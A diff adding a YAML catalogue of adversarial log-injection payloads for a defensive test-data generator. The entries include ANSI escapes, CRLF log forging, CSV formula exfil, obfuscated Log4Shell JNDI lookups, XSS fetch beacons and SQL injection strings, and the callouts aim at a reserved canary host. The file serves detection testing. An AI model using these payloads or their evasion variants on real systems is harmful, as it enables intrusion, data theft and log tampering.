@@ -1,0 +1,311 @@
+# Copyright (c) 2026 Cisco Systems, Inc. and its affiliates
+# SPDX-License-Identifier: MIT
+#
+# Adversarial-payload families and safety markers for the `adversarial_payload`
+# event type. The COUNTERPART to secret_families.yaml: where spillage emits a
+# provably-fake CREDENTIAL and the safety layer FORBIDS control bytes, an
+# adversarial payload deliberately carries a known log-pipeline injection
+# primitive (ANSI escape, CRLF, CSV formula, JNDI lookup, reflected-XSS, SQLi,
+# structured-log injection, oversized field) so defenders can verify that their
+# parsers / SIEMs / shippers / terminals / CSV exports / SQL-backed stores handle
+# untrusted log CONTENT safely.
+#
+# DATA-DRIVEN, USER-CUSTOMIZABLE. The template engine, surface handlers, safety
+# validation and ground-truth writing live in CODE
+# (evidenceforge/generation/adversarial_payload.py); the family definitions,
+# value templates, marker policy and host allowlist below are DATA and may be
+# extended via a project-local overlay at
+# .eforge/config/activity/payload_families.yaml (overlay can ADD families/markers
+# but can never weaken the marker requirement or the host allowlist).
+#
+# TEMPLATE TOKENS (expanded deterministically per event by the CODE engine):
+#   {marker}     the default poison marker (EFORGE_TEST), placed OUTSIDE active
+#                syntax so it survives the payload's own mechanism (an ANSI reset,
+#                a CSV formula eval, a JNDI lookup, both halves of a CRLF split)
+#   {canary}     the single canary host (canary.eforge.invalid; RFC 6761 reserved,
+#                guaranteed non-resolving — no real callback can ever be emitted)
+#   {esc} {cr} {lf} {tab}   the control bytes ESC(0x1b) / CR / LF / TAB — emitted
+#                RAW only on a surface listed in `raw_surfaces`; escaped to a
+#                literal (\x1b, \r\n) on every other surface
+#   {alnum:N}    N chars from [A-Za-z0-9]
+#   {host}       a cosmetic carrier host on an allowlisted multi-label domain
+#
+# A family declares EXACTLY ONE value source:
+#   value_template   a single synthesis template (one form per event)
+#   value_templates  an ORDERED list of variant templates — the canonical form PLUS
+#                    evasion/bypass variants; the engine picks one per event by seed
+#                    so a dataset spans real detection-evasion variety, letting a
+#                    defender test detection QUALITY (does the rule catch the
+#                    obfuscated form?) not just presence. EVERY variant is
+#                    safety-checked (marker-per-line + host allowlist) at load.
+#   examples         literal values (not token-expanded)
+#
+# SAFETY: every rendered payload MUST contain the EFORGE_TEST marker on every
+# physical line, and may embed only the canary host or an RFC 2606/6761/5737/3849/
+# 1918 reserved/private address (re-checked at load AND at generation, for every
+# value_templates variant, family-synthesized values, and user-supplied literal
+# `value:` inputs). A payload is a labeled artifact, never executed; it is inert at
+# generation and (with per-surface escaping) safe to view.
+
+default_marker: EFORGE_TEST
+
+# Substrings that mark a payload as synthetic/test content. Overlay may extend.
+markers:
+  - EFORGE_TEST
+  - EVIDENCEFORGE
+  - EXAMPLE
+  - DO_NOT_USE
+
+# The single canary host. Any URL/host token in a payload must resolve (after the
+# spillage-style alternate-encoding normalization) to this host or an allowlisted
+# reserved address.
+canary_host: canary.eforge.invalid
+
+# Hosts permitted to appear inside a payload (shares secret_families' policy).
+network_allowlist:
+  domains:
+    - example.com
+    - example.org
+    - example.net
+    - example.test
+    - invalid          # RFC 6761 reserved TLD (covers canary.eforge.invalid)
+
+# Adversarial-payload families. Each declares:
+#   name          stable identifier referenced by `family:` in an event
+#   description   one-line summary
+#   weakness_class human-readable durable weakness class (for docs + ground truth)
+#   value_template(s) per-event synthesis (must embed {marker}; tokens above)
+#   surfaces      semantic surfaces the family is valid in
+#   raw_surfaces  subset of `surfaces` where the family's control bytes are emitted
+#                 RAW (the realistic weakness); elsewhere they are escaped to a
+#                 literal that preserves the detection signal without corrupting an
+#                 unrelated record. Default [] (no raw control bytes).
+#   expected_defender_signal  what a hardened pipeline should do
+families:
+  - name: ansi_escape
+    description: Terminal control-sequence (CSI/OSC/SGR) injection in a raw-rendered log field.
+    weakness_class: >
+      Terminal/console escape-sequence injection: ESC-prefixed control sequences in a
+      log field move the cursor, clear lines, set colors, or set the terminal title
+      when the log is viewed in a TTY, pager, or naive SIEM console — letting an
+      attacker hide or spoof log lines. A durable viewer/pipeline weakness, not a CVE.
+    value_templates:
+      # Canonical: clear line + cursor-up + red SGR to overwrite/recolor a line.
+      - "{marker} {esc}[2K{esc}[1A{esc}[31mFAKE: connection reset by peer [ref {alnum:8}]{esc}[0m {marker}"
+      # OSC 0 terminal-title injection (ESC ] 0 ; title ST), spoofs the window title.
+      - "{marker} {esc}]0;FAKE-WINDOW-TITLE-{alnum:6}{esc}\\ {marker}"
+      # SGR-only spoofed alert banner (white-on-red) with no cursor movement.
+      - "{marker} {esc}[1;37;41mALERT spoofed banner {alnum:6}{esc}[0m {marker}"
+      # Zero-padded CSI parameters ([002K / [01A / [0031m) — terminals accept leading
+      # zeros, so this evades a scrubber whose signature keys on the exact param bytes
+      # ([2K / [1A / [31m) instead of the ESC[ … final-byte structure.
+      - "{marker} {esc}[002K{esc}[01A{esc}[0031mFAKE: disk healthy [ref {alnum:8}]{esc}[00m {marker}"
+      # Cursor-up + clear-line that rewrites the PREVIOUS visible line (raw CR splits).
+      - "{marker} status=ok{cr}{esc}[1A{esc}[2Kstatus=FAILED-spoof {alnum:6} {marker}"
+    surfaces: [syslog_message, process_command_line]
+    raw_surfaces: [syslog_message]
+    expected_defender_signal: >
+      The viewer/SIEM must render the ESC byte (0x1B) literally (e.g. as \x1b or a
+      control picture) rather than letting the terminal cursor-move, color, clear-line,
+      or set the title; a scrubber should flag ESC + CSI('[')/OSC(']') in a log field.
+
+  - name: crlf_log_forging
+    description: CRLF / newline log injection that splits one record into two (log forging).
+    weakness_class: >
+      CRLF / newline log injection (a.k.a. log forging / log splitting, CWE-117): an
+      attacker-controlled value carrying CR/LF splits one logical record into two,
+      forging a fake adjacent entry or breaking line-oriented parsers and SIEM ingest.
+      As old as line-oriented logs; the canonical "log untrusted input safely" test.
+    value_templates:
+      # Canonical CRLF split forging a "status=cleared" adjacent record.
+      - "field={marker}{cr}{lf}forged-entry: status=cleared actor=attacker src=192.0.2.7 session={alnum:10} {marker}"
+      # LF-only split (Unix line-oriented shippers that only break on \n).
+      - "field={marker}{lf}forged-entry: status=ok user=admin src=198.51.100.9 session={alnum:10} {marker}"
+      # CR-only split (consumers that treat a bare CR as a record boundary).
+      - "field={marker}{cr}forged-entry: auth=bypass actor=attacker src=203.0.113.5 token={alnum:10} {marker}"
+      # Double CRLF (header/body split style) forging a higher-severity line.
+      - "field={marker}{cr}{lf}{cr}{lf}forged-entry: level=CRITICAL msg=breach src=192.0.2.9 ref={alnum:10} {marker}"
+    surfaces: [syslog_message, http_request_url, http_referrer, http_user_agent]
+    raw_surfaces: [syslog_message]
+    # ET WEB_SERVER Possible CRLF Injection Attempt in HTTP Header — fires when the
+    # CRLF payload rides a cleartext http request to the modeled web server. The flat
+    # rule keys on a CR-LF sequence, so the LF-only / CR-only forge variants evade it
+    # (no alert) while the full-CRLF and double-CRLF variants fire — the detection-gap
+    # the dataset exercises.
+    ids_sid: 2012887
+    ids_fires_on: "\r\n"
+    expected_defender_signal: >
+      The pipeline must neutralize raw CR(0x0D)/LF(0x0A) — reject, percent/backslash-
+      escape, or strip — before write, emitting ONE record. Both halves carry the
+      marker so a split can never orphan an unmarked line that looks real.
+
+  - name: csv_formula
+    description: Spreadsheet formula injection that detonates when a log export is opened in Excel/Sheets.
+    weakness_class: >
+      CSV / spreadsheet formula injection: a log/export field beginning with = + - @
+      (or tab/CR variants) is interpreted as a formula when the exported CSV is opened
+      in a spreadsheet, enabling formula execution or data exfil via WEBSERVICE/
+      HYPERLINK. The trigger is the analyst's downstream export-to-spreadsheet step.
+    value_templates:
+      # The four spreadsheet formula-trigger chars (= + @ -) plus exfil functions, so a
+      # detection that only guards '=' is shown to miss + / @ / - prefixes. Each calls
+      # back only to the non-resolving canary.
+      - '=WEBSERVICE("https://{canary}/{marker}-{alnum:8}")&"{marker}"'
+      - '=HYPERLINK("https://{canary}/{marker}-{alnum:8}","CLICK-{marker}")'
+      - '+WEBSERVICE("https://{canary}/{marker}-{alnum:6}")&"{marker}"'
+      - '@SUM(1)&WEBSERVICE("https://{canary}/{marker}-{alnum:6}")&"{marker}"'
+      - '-WEBSERVICE("https://{canary}/{marker}-{alnum:6}")&"{marker}"'
+    # Only syslog_message: spreadsheet formula injection fires only when the EXPORTED
+    # CELL begins with the formula, so the payload must be the whole logged field
+    # value. On process_command_line the cell would start with the binary path (the
+    # formula sits inertly mid-string), so that surface is intentionally excluded.
+    surfaces: [syslog_message]
+    raw_surfaces: []
+    carriers:
+      # The payload is the entire field value (no benign prefix) so the exported
+      # cell's first non-whitespace char is a formula trigger and it actually triggers.
+      syslog_message: ['{value}']
+    expected_defender_signal: >
+      The CSV export must prefix a field whose first non-whitespace char is = + - @
+      with a single quote (or tab) so the spreadsheet treats it as text. Inert
+      everywhere except a spreadsheet that auto-evaluates formulas.
+
+  - name: log4shell
+    description: JNDI lookup / log-message expression injection (CVE-2021-44228 class).
+    weakness_class: >
+      JNDI lookup / log-message expression injection: a logging library that
+      evaluates ${...} lookups in logged input performs an attacker-directed JNDI
+      (LDAP/RMI/DNS) lookup, leading to remote class loading / RCE or blind exfil.
+      The reference payload SOCs build and tune detections against.
+    value_templates:
+      # Canonical ${jndi:ldap://...}.
+      - "{marker} ${jndi:ldap://{canary}/{marker}-{alnum:8}}"
+      # ${lower:} lookup obfuscation of the jndi/ldap keywords (classic WAF bypass).
+      - "{marker} ${${lower:j}ndi:${lower:l}dap://{canary}/{marker}-{alnum:8}}"
+      # ${::-x} default-value obfuscation spelling out 'jndi' char-by-char.
+      - "{marker} ${${::-j}${::-n}${::-d}${::-i}:ldap://{canary}/{marker}-{alnum:8}}"
+      # ${env:X:-j} nested env-default obfuscation (a real in-the-wild WAF bypass:
+      # the 'j' and 'l' are reconstructed from missing-env defaults, so 'jndi'/'ldap'
+      # never appear contiguously and a flat-substring rule misses it).
+      - "{marker} ${${env:BARFOO:-j}ndi:${lower:l}dap://{canary}/{marker}-{alnum:8}}"
+      # Alternate JNDI transports a signature must also cover.
+      - "{marker} ${jndi:rmi://{canary}/{marker}-{alnum:8}}"
+      - "{marker} ${jndi:dns://{canary}/{marker}-{alnum:8}}"
+      # Nested ${env:} lookup + explicit LDAP port.
+      - "{marker} ${jndi:ldap://{canary}:1389/${env:USER}-{marker}-{alnum:6}}"
+    surfaces: [http_user_agent, http_request_url, http_referrer, syslog_message]
+    raw_surfaces: []
+    # ET WEB_SERVER Possible CVE-2021-44228 Log4j RCE Attempt — a FLAT rule keyed on the
+    # literal ${jndi: lookup, so the canonical / rmi / dns variants fire but the lookup-
+    # obfuscation variants (${lower:j}ndi, ${::-j}…, ${env:X:-j}ndi) evade it (no alert).
+    ids_sid: 2024317
+    ids_fires_on: "${jndi:"
+    expected_defender_signal: >
+      A WAF/IDS/log scanner must match ${jndi:...} (and obfuscated ${lower:j}ndi /
+      ${::-j} forms) and the ldap/ldaps/rmi/dns schemes, and strip/encode ${ or alert.
+      The canary host is non-resolving so a still-vulnerable Log4j cannot complete a
+      real callback.
+
+  - name: xss_reflection
+    description: "Reflected-XSS-style markup in a web-log field."
+    weakness_class: >
+      Reflected/stored cross-site-scripting payload (<script>, onerror=) carried in a
+      web log field: a SIEM web UI or log dashboard that renders the field value
+      without HTML-encoding executes the script in the analyst's browser. A durable
+      log-VIEWER weakness (distinct from app XSS).
+    value_templates:
+      # Canonical inline <script> beacon to the canary.
+      - "<script>fetch('https://{canary}/{marker}-{alnum:8}')</script>{marker}"
+      # <img onerror=> (fires without a <script> tag — bypasses naive '<script>' filters).
+      - "<img src=x onerror=\"fetch('https://{canary}/{marker}-{alnum:8}')\">{marker}"
+      # <svg onload=> (compact, no quotes/spaces around the handler).
+      - "<svg/onload=fetch('https://{canary}/{marker}-{alnum:6}')>{marker}"
+      # Mixed-case <ScRiPt> to defeat case-sensitive substring filters.
+      - "<ScRiPt>fetch('https://{canary}/{marker}-{alnum:6}')</ScRiPt>{marker}"
+      # Attribute-breakout ("> closes a preceding tag/attribute, then injects).
+      - "\"><script>fetch('https://{canary}/{marker}-{alnum:6}')</script>{marker}"
+    surfaces: [http_request_url, http_referrer, http_user_agent, syslog_message]
+    raw_surfaces: []
+    expected_defender_signal: >
+      The SIEM/dashboard must HTML-encode (or sanitize) log field values before
+      rendering them in a browser, so the markup displays as literal text — including
+      tag-name case variants and event-handler attributes, not just '<script>'.
+  - name: sql_injection
+    description: "SQL-injection test strings in a log field."
+    weakness_class: >
+      SQL injection (CWE-89) carried in an untrusted log field: a SQL-backed SIEM /
+      log store that string-concatenates the field into a query is exploitable, and a
+      WAF/IDS in front of the web tier should match the injection on the wire. Durable
+      class; the canonical UNION/boolean/time-based/error-based forms below let a
+      defender test detection QUALITY across evasion variants. Carries no real target
+      (no host, no schema-qualified table) — an inert detection-test string only.
+    value_templates:
+      # UNION-based column extraction (matches "UNION SELECT" IDS signatures).
+      - "{marker}' UNION SELECT username,password FROM users-- {marker} {alnum:6}"
+      # Inline-comment (/**/) whitespace evasion — THE canonical WAF/IDS bypass: a rule
+      # keyed on the literal "UNION SELECT" token misses "UNION/**/SELECT".
+      - "{marker}'/**/UNION/**/SELECT/**/username,password/**/FROM/**/users-- {marker} {alnum:6}"
+      # Boolean tautology auth bypass.
+      - "{marker}' OR '1'='1'-- {marker} {alnum:6}"
+      # UNION version disclosure (also exercises "SELECT ... FROM"-class rules).
+      - "{marker}' AND 1=0 UNION SELECT NULL,@@version,NULL FROM users-- {marker} {alnum:6}"
+      # Time-based blind (SLEEP), a detector for behavioural/latency rules.
+      - "{marker}' AND SLEEP(5)-- {marker} {alnum:6}"
+      # Error-based extraction via extractvalue/concat.
+      - "{marker}' AND extractvalue(1,concat(0x7e,user()))-- {marker} {alnum:6}"
+      # Boolean + LIMIT (single-row exfil shape).
+      - "{marker}1' OR 1=1 LIMIT 1-- {marker} {alnum:6}"
+    surfaces: [http_request_url, http_referrer, http_user_agent, process_command_line, syslog_message]
+    raw_surfaces: []
+    # ET WEB_SERVER Possible SQL Injection Attempt UNION SELECT — a FLAT rule keyed on
+    # the literal "UNION SELECT" token: the UNION-based variants fire, while the inline-
+    # comment (UNION/**/SELECT), boolean, time-based and error-based variants evade it.
+    ids_sid: 2009714
+    ids_fires_on: "UNION SELECT"
+    expected_defender_signal: >
+      A SQL-backed store must parameterize/bind log fields (never string-concatenate
+      them into a query); a WAF/IDS should match UNION SELECT, OR '1'='1', stacked /
+      time-based (SLEEP/WAITFOR) and error-based (extractvalue) injection on the wire.
+  - name: structured_log_injection
+    description: "JSON / key-value (logfmt) structured-log field injection."
+    weakness_class: >
+      Structured-log injection (CWE-117, structured variant): an untrusted value
+      string-concatenated into a JSON or logfmt record — rather than serialized by a
+      real encoder — lets an attacker close the current field and forge SIBLING keys
+      (spoofing severity/outcome/user) or break the downstream structured parser. A
+      durable shipper/SIEM weakness as pipelines move from line logs to JSON.
+    value_templates:
+      # Close a JSON string value and inject sibling keys (spoofed severity/outcome).
+      - "{marker}\",\"severity\":\"INFO\",\"forged\":\"yes\",\"outcome\":\"success\",\"tag\":\"{marker}"
+      # logfmt key=value injection (spoofed level/user/outcome).
+      - "{marker} level=error msg=\"forged entry\" user=admin outcome=success tag={marker}"
+      # Backslash-then-quote escape break (naive \\\" handling reopens the field).
+      - "{marker}\\\",\"admin\":true,\"role\":\"superuser\",\"tag\":\"{marker}"
+      # Raw CRLF + a complete forged JSON object on its own line (syslog raw surface).
+      - "{marker}{cr}{lf}{\"ts\":\"2026-01-01T00:00:00Z\",\"level\":\"CRITICAL\",\"msg\":\"forged alert\",\"tag\":\"{marker}\"}"
+    surfaces: [syslog_message, http_user_agent, http_request_url, http_referrer, process_command_line]
+    raw_surfaces: [syslog_message]
+    expected_defender_signal: >
+      Log records must be built by a real JSON/structured encoder that escapes '"',
+      '\\' and control bytes; untrusted values must never be string-concatenated into
+      a structured line. A parser should reject/quarantine a record whose field count
+      or nesting changed unexpectedly.
+  - name: oversized_field
+    description: "Oversized / unbounded log field to test truncation and ingest limits."
+    weakness_class: >
+      Oversized / unbounded log field (CWE-400, uncontrolled resource consumption): a
+      multi-kilobyte untrusted value tests a pipeline's field-length caps, buffer
+      handling, ingest cost, and downstream regex exposure. A hardened pipeline must
+      cap field length and truncate VISIBLY (not drop the record silently, overflow a
+      fixed buffer, or backtrack catastrophically on attacker-controlled length).
+    value_templates:
+      # ~2 KB and ~4 KB single-field padding bracketed by the marker on both ends, so a
+      # silent mid-field truncation still leaves a marked, self-evidently synthetic tail.
+      - "{marker} OVERSIZED-FIELD-PADDING-{alnum:2048}-END {marker}"
+      - "{marker} OVERSIZED-FIELD-PADDING-{alnum:4096}-END {marker}"
+    surfaces: [syslog_message, http_user_agent, http_request_url, process_command_line]
+    raw_surfaces: []
+    expected_defender_signal: >
+      Enforce a documented maximum field length with VISIBLE truncation (e.g. a
+      "...[truncated]" marker), cap or reject at ingest, and avoid catastrophic-
+      backtracking regexes on untrusted log content; the record must survive, marked.
